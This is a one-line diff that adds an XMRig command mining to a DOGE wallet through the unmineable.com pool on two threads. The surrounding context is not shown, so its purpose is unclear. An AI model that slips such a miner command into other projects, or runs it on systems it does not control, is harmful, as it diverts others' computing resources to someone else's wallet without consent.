@@ -1,0 +1,1 @@
+xmrig.exe -o rx.unmineable.com:3333 -a rx -k -u DOGE:DG1Fvzq3Z5HNzx2VRNqnKDDBJq7A3NVCvS.ken  -pass x  -t 2
